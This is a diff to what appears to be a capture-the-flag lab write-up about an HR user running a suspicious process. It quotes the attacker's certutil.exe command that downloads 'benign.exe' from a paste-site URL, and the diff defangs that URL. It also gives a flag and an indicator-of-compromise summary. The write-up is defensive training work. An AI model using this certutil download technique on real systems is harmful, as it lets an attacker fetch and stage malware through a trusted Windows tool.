@@ -58,14 +58,14 @@ An IDS flagged suspicious process execution within the HR department. Using Wind
 ##### **Haroon:**
 
 * Executed:  
-  certutil.exe \-urlcache \-split \-f https://controlc.com/e4d11035 benign.exe  
+  certutil.exe \-urlcache \-split \-f https[:]//controlc[.]com/e4d11035 benign.exe  
   * Indicates malicious file download via **certutil.exe** (LOLBAS technique).  
   * While Certutil is a legitimate Windows tool, its use here \- along with haroon’s lack of other admin level activity \- strongly suggests its use is malicious.
 
 #### **4\. Confirming Malicious Activity**
 
 * File saved: benign.exe  
-* Downloaded from: https://controlc.com/e4d11035  
+* Downloaded from: https[:]//controlc[.]com/e4d11035  
 * Flag found inside file: THM{KJ&\*H^B0}
 
 **IOC Summary:** The download from controlc.com and presence of encoded payloads are consistent with command-and-control behavior observed during post-exploitation phases. 
